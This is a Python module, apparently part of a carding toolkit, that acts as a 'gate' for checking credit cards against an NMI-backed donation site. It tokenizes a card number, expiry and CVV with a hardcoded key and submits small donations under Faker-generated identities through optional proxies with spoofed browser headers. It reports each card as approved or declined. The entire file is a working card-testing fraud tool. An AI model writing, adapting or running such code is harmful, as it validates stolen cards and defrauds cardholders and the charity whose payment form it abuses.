# Pure gate motor for 'nmi' — NMI (AIA Donations) gateway.
# Source: new_gates/nmi.py

import random

import requests as rq
from faker import Faker
from uuid import uuid4

_GATEWAY = 'NMI Donation (AIA)'

_fake = Faker('en_US')
_mail = lambda: f"{_fake.user_name()}@{random.choice(['gmail.com', 'yahoo.com', 'hotmail.com'])}"
_name = lambda: (_fake.first_name().strip().replace(' ', ''), _fake.last_name().strip().replace(' ', ''))
_num = lambda: str(random.randint(1000000000, 9999999999))
_pcode = lambda: f"{random.randint(0, 99999):05d}"
_rid = lambda: str(uuid4())
_prc = lambda amount: amount * 16.90

_TOKEN_KEY = '3c99E6-JHnsxf-Hcebkj-25f5f9'


def _save_token(data, session, headers):
    session.post('https://secure.nmi.com/token/api/save_multipart_token', headers=headers, json=data)


def _headers(proxy):
    hds = {
        'sec-ch-ua-platform': '"Android"',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 7; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua': '"Chromium";v="136", "Brave";v="136", "Not.A/Brand";v="99"',
        'Content-Type': 'application/x-www-form-urlencoded',
        'sec-ch-ua-mobile': '?1',
        'Accept': '*/*',
        'Sec-GPC': '1',
        'Accept-Language': 'es-MX,es;q=0.7',
        'Origin': 'https://nmi-donations-aia-production.up.railway.app',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://nmi-donations-aia-production.up.railway.app/',
    }
    return hds


def _flow(num, mes, ano, cvv, proxy=None):
    amount = random.randint(1, 5)
    mes = mes.zfill(2)
    ano = ano[-2:] if len(ano) == 4 else ano
    date = f'{mes}{ano}'
    fn, ln = _name()
    with rq.Session() as session:
        try:
            if proxy:
                session.proxies.update({'http': proxy, 'https': proxy})
            headers = _headers(proxy)
            data = f'tokenizationKey={_TOKEN_KEY}&source=14&version=1.0.1'
            res = session.post('https://secure.nmi.com/token/api/create', headers=headers, data=data)
            token = res.json().get('token')
            if not token:
                return {'status': True, 'success': False, 'response': 'Declined ❌ | Token no creado'}
            headers['Content-type'] = 'application/json;charset=UTF-8'
            _save_token({'tokenizationKey': _TOKEN_KEY, 'cartCorrelationId': '', 'tokenId': token,
                         'data': [{'elementId': 'ccnumber', 'value': num}]}, session, headers)
            _save_token({'tokenizationKey': _TOKEN_KEY, 'cartCorrelationId': '', 'tokenId': token,
                         'data': [{'elementId': 'ccexp', 'value': date}]}, session, headers)
            _save_token({'tokenizationKey': _TOKEN_KEY, 'cartCorrelationId': '', 'tokenId': token,
                         'data': [{'elementId': 'cvv', 'cvvDisplay': True, 'value': cvv}]}, session, headers)
            payload = {'firstName': fn, 'lastName': ln, 'company': '', 'email': _mail(), 'phone': _num(),
                       'zip': _pcode(), 'reason': f'Donation {amount} dollars', 'amount': amount,
                       'token': token, 'requestId': _rid()}
            res = session.post('https://nmi-donations-aia-production.up.railway.app/api/payments',
                               headers=headers, json=payload, allow_redirects=False)
            if 'Payment failed' in res.text:
                return {'status': True, 'success': False, 'response': f'Declined ❌ | Pago ${_prc(amount)} fallido'}
            if 'Your secure session has expired.' in res.text:
                return {'status': True, 'success': True, 'response': f'Approved ✅ | Pago ${_prc(amount)} Aprobado'}
            if '"error"' in res.text and '"expired":false' in res.text:
                try:
                    msg = res.json().get('error', 'No Message')
                except Exception:
                    msg = 'No Message'
                return {'status': True, 'success': False, 'response': f'Declined ❌ | {msg}'}
            return {'status': True, 'success': False, 'response': f'Declined ❌ | {res.text[:80]}'}
        except Exception as e:
            return {'status': False, 'raise': str(e)[:200]}


def _checker(cc, bin_data, proxy=None):
    try:
        return _flow(cc[0], cc[1], cc[2], cc[3], proxy=proxy)
    except Exception as e:
        return {'status': False, 'raise': str(e)[:200]}


def run_check(cc, bin_data, ctx=None):
    ctx = ctx or {}
    proxy = (ctx.get('proxy') or '').strip()
    r = _checker(cc, bin_data, proxy=proxy)
    if not r.get('status'):
        return {'status': 'Error ⚠️', 'response': r.get('raise', 'Gate error')}
    return {'status': 'Approved ✅' if r.get('success') else 'Declined ❌', 'response': r.get('response', '')}


if __name__ == '__main__':
    print(run_check(['4000222379753652', '09', '29', '938'], ''))